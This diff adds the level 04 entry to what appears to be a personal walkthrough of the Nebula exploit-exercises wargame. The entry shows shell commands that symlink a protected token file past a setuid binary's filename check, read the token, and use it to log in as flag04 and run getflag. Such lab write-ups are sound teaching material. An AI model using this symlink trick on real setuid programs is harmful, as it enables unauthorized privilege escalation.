@@ -5,6 +5,25 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 04
+--------
+
+##### use a sym link to read token with suid flag04 binary
+```bash
+level04@nebula:~$ ln -sf /home/flag04/token foo
+level04@nebula:~$ /home/flag04/flag04 foo
+06508b5e-8909-4f38-b630-fdb148a848a2
+```
+
+##### use token for flag04 user and execute getflag
+```bash
+level04@nebula:~$ su - flag04
+Password: 
+flag04@nebula:~$ getflag
+You have successfully executed getflag on a target account
+```
+
+
 level 05
 --------
 
